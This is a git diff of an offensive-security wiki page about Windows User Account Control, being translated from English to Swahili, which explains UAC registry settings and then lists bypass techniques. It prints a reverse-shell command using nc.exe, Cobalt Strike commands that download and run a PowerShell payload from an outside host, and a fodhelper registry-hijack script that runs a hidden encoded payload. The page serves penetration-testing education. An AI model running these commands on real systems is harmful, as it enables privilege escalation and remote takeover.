@@ -1,58 +1,59 @@
-# UAC - User Account Control
+# UAC - Udhibiti wa Akaunti ya Mtumiaji
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli za juu**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kufanya kazi ambazo **zinaweza kuhatarisha mfumo**. Wakati UAC imewezeshwa, programu na kazi kila wakati **zinafanya kazi chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi aidhinishe waziwazi programu/hizi kazi kuwa na ufikiaji wa kiwango cha msimamizi kwenye mfumo ili kuendesha. Ni kipengele cha urahisi kinacholinda wasimamizi kutokana na mabadiliko yasiyokusudiwa lakini hakichukuliwi kama mpaka wa usalama.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kidokezo cha idhini kwa shughuli zinazohitaji mamlaka ya juu**. Programu zina ngazi mbalimbali za `integrity`, na programu yenye **ngazi ya juu** inaweza kufanya kazi ambazo zinaweza **kuathiri usalama wa mfumo**. Wakati UAC imewezeshwa, programu na shughuli zinaendesha kila wakati **chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi kwa wazi awaruhusu programu/shughuli hizo kupata ufikiaji wa kiwango cha msimamizi kwenye mfumo ili kuendesha. Ni kipengele cha urahisi kinachowalinda wasimamizi dhidi ya mabadiliko yasiyotarajiwa lakini haizingatiwi kama mpaka wa usalama.
 
-Kwa maelezo zaidi kuhusu viwango vya integrity:
+Kwa habari zaidi kuhusu ngazi za integrity:
+
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Wakati UAC ipo, mtumiaji wa msimamizi anapewa tokeni 2: ufunguo wa mtumiaji wa kawaida, ili kufanya vitendo vya kawaida kama kiwango cha kawaida, na moja yenye ruhusa za msimamizi.
+Wakati UAC iko, mtumiaji msimamizi anapewa tokeni 2: tokeni ya kawaida ya mtumiaji, kwa kutekeleza vitendo vya kawaida kwa kiwango cha kawaida, na tokeni moja yenye haki za msimamizi.
 
-Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inajadili jinsi UAC inavyofanya kazi kwa undani mkubwa na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kuunda jinsi UAC inavyofanya kazi maalum kwa shirika lao katika ngazi ya ndani (wakati wa kutumia secpol.msc), au kuundwa na kusukumwa kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali inajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy ambayo inaweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo zaidi:
+Ukurasa huu [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) unajadili jinsi UAC inavyofanya kazi kwa kina na unajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kusanidi jinsi UAC inavyofanya kazi kulingana na shirika lao kwa ngazi ya eneo (kutumia secpol.msc), au kusanidiwa na kusambazwa kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali inajadiliwa kwa undani [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy inayoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:
 
-| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
+| Mpangilio wa Group Policy                                                                                                                                                                                                                                                                                                                                                           | Kifunguo cha Rejista                | Mipangilio ya chaguo-msingi                                  |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
-| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
-| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
-| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
-| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
-| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
-| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
-| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
-| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
-| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
+| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Imezimwa                                                     |
+| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Imezimwa                                                     |
+| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Omba idhini kwa binaries zisizo za Windows                   |
+| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Ombwa taarifa za kuingia kwenye desktop salama              |
+| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Imewezeshwa (chaguo-msingi kwa home) Imezimwa (chaguo-msingi kwa enterprise) |
+| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Imezimwa                                                     |
+| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Imewezeshwa                                                   |
+| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Imewezeshwa                                                   |
+| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Imewezeshwa                                                   |
+| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Imewezeshwa                                                   |
 
 ### UAC Bypass Theory
 
-Baadhi ya programu zina **autoelevated automatically** ikiwa **mtumiaji ni** sehemu ya **kikundi cha wasimamizi**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary inapaswa kuwa **imeandikwa saini na Microsoft** pia.
+Baadhi ya programu zinapewa **autoelevated automatically** ikiwa **mtumiaji ni mwanachama** wa **kundi la administrator**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary pia lazima iwe **imesainiwa na Microsoft**.
 
-Mchakato mwingi wa auto-elevate unatoa **ufanisi kupitia vitu vya COM au seva za RPC**, ambazo zinaweza kuitwa kutoka kwa michakato inayofanya kazi na integrity ya kati (ruhusa za mtumiaji wa kawaida). Kumbuka kwamba COM (Component Object Model) na RPC (Remote Procedure Call) ni mbinu ambazo programu za Windows hutumia kuwasiliana na kutekeleza kazi kati ya michakato tofauti. Kwa mfano, **`IFileOperation COM object`** imeundwa kushughulikia operesheni za faili (kunakili, kufuta, kuhamasisha) na inaweza kuongeza ruhusa kiotomatiki bila kuonyeshwa.
+Mchakato wa auto-elevate mwingi huweka **utendaji kupitia COM objects au RPC servers**, ambao yanaweza kuitwa kutoka kwa michakato inayokimbia kwa integrity ya medium (idhani ya mtumiaji wa kawaida). Kumbuka COM (Component Object Model) na RPC (Remote Procedure Call) ni mbinu ambazo programu za Windows hutumia kuwasiliana na kutekeleza kazi kati ya michakato tofauti. Kwa mfano, **`IFileOperation COM object`** imetengenezwa kushughulikia shughuli za faili (kopi, kufuta, kuhamisha) na inaweza auto-elevate vibali bila ombi.
 
-Kumbuka kwamba baadhi ya ukaguzi unaweza kufanywa, kama kuangalia ikiwa mchakato ulifanywa kutoka kwenye **System32 directory**, ambayo inaweza kupuuziliwa mbali kwa mfano **kuingiza ndani ya explorer.exe** au executable nyingine iliyoko System32.
+Kumbuka kwamba baadhi ya ukaguzi unaweza kufanywa, kama kuangalia ikiwa mchakato ulitendewa kutoka kwa **System32 directory**, ambayo inaweza kupitishwa kwa mfano kwa **kufunya katika explorer.exe** au executable nyingine iliyoko System32.
 
-Njia nyingine ya kupita ukaguzi hizi ni **kubadilisha PEB**. Kila mchakato katika Windows una Block ya Mazingira ya Mchakato (PEB), ambayo inajumuisha data muhimu kuhusu mchakato, kama vile njia yake ya executable. Kwa kubadilisha PEB, washambuliaji wanaweza kudanganya (spoof) eneo la mchakato wao mbaya, na kuifanya ionekane inafanya kazi kutoka kwenye directory iliyoaminika (kama system32). Taarifa hii iliyodanganywa inadanganya kitu cha COM kujiinua kiotomatiki bila kumwambia mtumiaji.
+Njia nyingine ya kupitishwa kwa ukaguzi huu ni **kurekebisha PEB**. Kila mchakato katika Windows una Process Environment Block (PEB), ambayo inajumuisha data muhimu kuhusu mchakato, kama njia ya executable yake. Kwa kurekebisha PEB, mashambulizi wanaweza kuiga (spoof) mahali pa mchakato wao hatari, kuonekana kama inaruka kutoka kwa saraka ya kuaminika (kama system32). Taarifa hii iliyodanganywa inamshawishi COM object auto-elevate vibali bila kumwuliza mtumiaji.
 
-Kisha, ili **kupita** **UAC** (kuinua kutoka **kiwango** cha kati **hadi cha juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wowote** kwa sababu itatekelezwa kutoka kwenye **mchakato wa kiwango cha juu**.
+Kisha, ili **kupitisha** **UAC** (kuinua kutoka kwa integrity ya **medium** hadi **high**), baadhi ya mashambulizi hutumia aina hizi za binaries kutekeleza **code yoyote** kwa sababu italetea kutekelezwa kutoka kwa mchakato wa integrity ya High.
 
-Unaweza **kuangalia** _**Manifest**_ ya binary ukitumia zana _**sigcheck.exe**_ kutoka Sysinternals. (`sigcheck.exe -m <file>`) Na unaweza **kuona** **kiwango cha integrity** cha michakato ukitumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).
+Unaweza **kuangalia** _**Manifest**_ ya binary kwa kutumia zana _**sigcheck.exe**_ kutoka Sysinternals. (`sigcheck.exe -m <file>`) Na unaweza **kuona** ngazi ya **integrity** ya michakato kwa kutumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).
 
 ### Check UAC
 
-Ili kuthibitisha ikiwa UAC imewezeshwa fanya:
+Ili kuthibitisha kama UAC imewezeshwa fanya:
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Ikiwa ni **`1`** basi UAC ime **wezeshwa**, ikiwa ni **`0`** au haipo, basi UAC ni **isiyo active**.
+Kama ni **`1`** basi UAC imewezeshwa, ikiwa ni **`0`** au haipo, basi UAC haifanyi kazi.
 
 Kisha, angalia **ni kiwango gani** kimewekwa:
 ```
@@ -61,29 +62,29 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
-- Ikiwa **`0`** basi, UAC haitatoa ujumbe (kama **imezimwa**)
-- Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza faili ya binary kwa haki za juu (katika Desktop Salama)
-- Ikiwa **`2`** (**Daima niarifu**) UAC daima itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
-- Ikiwa **`3`** kama `1` lakini si lazima katika Desktop Salama
-- Ikiwa **`4`** kama `2` lakini si lazima katika Desktop Salama
-- ikiwa **`5`**(**kawaida**) itauliza msimamizi kuthibitisha kuendesha binaries zisizo za Windows kwa mamlaka ya juu
+- If **`0`** then, UAC won't prompt (like **disabled**)
+- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
+- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
+- If **`3`** like `1` but not necessary on Secure Desktop
+- If **`4`** like `2` but not necessary on Secure Desktop
+- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges
 
-Kisha, unapaswa kuangalia thamani ya **`LocalAccountTokenFilterPolicy`**\
-Ikiwa thamani ni **`0`**, basi, mtumiaji tu wa **RID 500** (**Msimamizi wa ndani**) anaweza kufanya **kazi za usimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kundi la "Administrators"** zinaweza kufanya hivyo.
+Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
+If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.
 
-Na, hatimaye angalia thamani ya funguo **`FilterAdministratorToken`**\
-Ikiwa **`0`**(kawaida), akaunti ya **Msimamizi wa ndani inaweza** kufanya kazi za usimamizi wa mbali na ikiwa **`1`** akaunti ya msimamizi wa ndani **haiwezi** kufanya kazi za usimamizi wa mbali, isipokuwa `LocalAccountTokenFilterPolicy` imewekwa kuwa `1`.
+And, finally take a look at the value of the key **`FilterAdministratorToken`**\
+If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.
 
-#### Muhtasari
+#### Summary
 
-- Ikiwa `EnableLUA=0` au **haipo**, **hakuna UAC kwa mtu yeyote**
-- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=1` , Hakuna UAC kwa mtu yeyote**
-- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=0`, Hakuna UAC kwa RID 500 (Msimamizi wa ndani)**
-- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=1`, UAC kwa kila mtu**
+- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
+- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
+- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
+- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**
 
-Taarifa hii yote inaweza kukusanywa kwa kutumia moduli ya **metasploit**: `post/windows/gather/win_privs`
+All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`
 
-Unaweza pia kuangalia makundi ya mtumiaji wako na kupata kiwango cha uaminifu:
+You can also check the groups of your user and get the integrity level:
 ```
 net user %username%
 whoami /groups | findstr Level
@@ -91,15 +92,15 @@ whoami /groups | findstr Level
 ## UAC bypass
 
 > [!TIP]
-> Kumbuka kwamba ikiwa una ufikiaji wa picha kwa mwathirika, UAC bypass ni rahisi kwani unaweza kubofya tu "Ndio" wakati ujumbe wa UAC unapoonekana
+> Kumbuka kwamba ikiwa una ufikiaji wa grafiki kwa upande wa mwathiriwa, UAC bypass ni rahisi kwani unaweza kubofya "Yes" unapopokea onyo la UAC
 
-UAC bypass inahitajika katika hali zifuatazo: **UAC imewashwa, mchakato wako unafanya kazi katika muktadha wa uaminifu wa kati, na mtumiaji wako ni sehemu ya kundi la wasimamizi**.
+UAC bypass inahitajika katika hali zifuatazo: **UAC imewashwa, mchakato wako unakimbia katika muktadha wa medium integrity, na mtumiaji wako ni sehemu ya administrators group**.
 
-Ni muhimu kutaja kwamba ni **vigumu zaidi kupita UAC ikiwa iko katika kiwango cha juu zaidi cha usalama (Daima) kuliko ikiwa iko katika viwango vingine vyovyote (Kawaida).**
+Ni muhimu kutaja kwamba ni **ngumu zaidi ku-bypass UAC ikiwa iko katika kiwango cha juu kabisa cha usalama (Always) kuliko ikiwa iko katika mojawapo ya viwango vingine (Default).**
 
-### UAC disabled
+### UAC imezimwa
 
-Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza shell ya kinyume na ruhusa za admin** (kiwango cha juu cha uaminifu) ukitumia kitu kama:
+Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **execute a reverse shell with admin privileges** (high integrity level) kwa kutumia kitu kama:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -110,12 +111,12 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Sana** Msingi UAC "bypass" (ufikiaji wa mfumo wa faili kamili)
+### **Msingi Sana** UAC "bypass" (upatikanaji kamili wa mfumo wa faili)
 
-Ikiwa una shell na mtumiaji ambaye yuko ndani ya kundi la Wasimamizi unaweza **kuunganisha C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) ndani ya diski mpya na utakuwa na **ufikiaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Msimamizi).
+Ikiwa una shell na mtumiaji aliyeko ndani ya kikundi cha Administrators, unaweza **mount the C$** iliyoshirikiwa kupitia SMB (file system) kama drive mpya ndani ya eneo la mfumo na utapata **upatikanaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Administrator).
 
 > [!WARNING]
-> **Inaonekana kama hila hii haitumiki tena**
+> **Inaonekana hila hii haifanyi kazi tena**
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -123,9 +124,9 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
-### UAC bypass with cobalt strike
+### UAC bypass na cobalt strike
 
-Mbinu za Cobalt Strike zitaweza kufanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu cha usalama.
+Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu kabisa cha usalama.
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -137,18 +138,17 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** na **Metasploit** pia zina moduli kadhaa za **kuepuka** **UAC**.
+**Empire** na **Metasploit** pia zina moduli kadhaa za **bypass** **UAC**.
 
 ### KRBUACBypass
 
-Hati na zana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Nyaraka na zana ziko katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
 ### UAC bypass exploits
 
-[**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
-Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maonyo kwa programu nyingine** ambazo zita **onya** **mtumiaji** kwamba kuna kitu kinatokea.
+[**UACME** ](https://github.com/hfiref0x/UACME) ambayo ni **mkusanyiko** wa kadhaa UAC bypass exploits. Kumbuka kwamba utahitaji **compile UACME using Visual Studio or msbuild**. Ujenzi huo utatengeneza executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unayohitaji.**\ Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya bypasses zitaamsha **programu nyingine** ambazo zitatuma **taarifa** kwa **mtumiaji** kwamba kuna kitu kinaendelea.
 
-UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusisha toleo lako:
+UACME ina **build version kutoka ambako kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayoathiri matoleo yako:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -156,13 +156,45 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
+Pia, kwa kutumia [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page utapata toleo la Windows `1607` kutoka kwa matoleo ya build.
+
+### UAC Bypass – fodhelper.exe (Registry hijack)
+
+Binary ya kuaminika `fodhelper.exe` huinuliwa kiotomatiki kwenye Windows za kisasa. Ikitumika, inalenga njia ya rejista ya kila mtumiaji hapa chini bila kuthibitisha verb `DelegateExecute`. Kuweka amri hapo kunaruhusu mchakato wa Medium Integrity (mtumiaji yuko kwenye Administrators) kuanzisha mchakato wa High Integrity bila onyo la UAC.
+
+Njia ya rejista inayoulizwa na fodhelper:
+```
+HKCU\Software\Classes\ms-settings\Shell\Open\command
+```
+Hatua za PowerShell (weka payload yako, kisha trigger):
+```powershell
+# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
+C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"
+
+# 1) Create the vulnerable key and values
+New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
+
+# 2) Set default command to your payload (example: reverse shell or cmd)
+# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force
+
+# 3) Trigger auto-elevation
+Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"
+
+# 4) (Recommended) Cleanup
+Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
+```
+Notes:
+- Inafanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni default/lenient (si Always Notify na vikwazo vya ziada).
+- Tumia njia ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka mchakato wa 32-bit kwenye Windows 64-bit.
+- Payload inaweza kuwa amri yoyote (PowerShell, cmd, au njia ya EXE). Epuka UI zinazochochea kusubiri ruhusa kwa ajili ya kimya (stealth).
 
 #### More UAC bypass
 
 **All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).
 
-You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:
+Unaweza kupata kwa kutumia session ya **meterpreter**. Migrate kwenda kwa **process** ambayo ina thamani ya **Session** sawa na **1**:
 
 ![](<../../images/image (863).png>)
 
@@ -170,27 +202,33 @@ You can get using a **meterpreter** session. Migrate to a **process** that has t
 
 ### UAC Bypass with GUI
 
-If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.
+Ikiwa una ufikiaji wa **GUI unaweza tu kukubali UAC prompt** unapoupata, kwa hakika huhitaji bypass. Hivyo, kupata ufikiaji wa GUI kutakuwezesha kupita UAC.
 
-Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.
+Zaidi ya hayo, ikiwa unapata session ya GUI ambayo mtu alikuwa anaitumia (inawezekana kupitia RDP) kuna **zana baadhi zitakazoendeshwa kama administrator** ambapo unaweza **kufanya** **cmd** kwa mfano **as admin** moja kwa moja bila kuonyeshwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa kidogo zaidi **stealthy**.
 
 ### Noisy brute-force UAC bypass
 
-If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.
+Ikiwa hukujali kuhusu kelele unaweza daima **kimbia kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) kinachotaka kuinua ruhusa hadi mtumiaji atakubali.
 
 ### Your own bypass - Basic UAC bypass methodology
 
-If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
+Ikiwa utaangalia **UACME** utagundua kwamba **uwezekano mkubwa UAC bypasses hutumia udhaifu wa Dll Hijacking** (hasa kuandika dll hatari kwenye _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
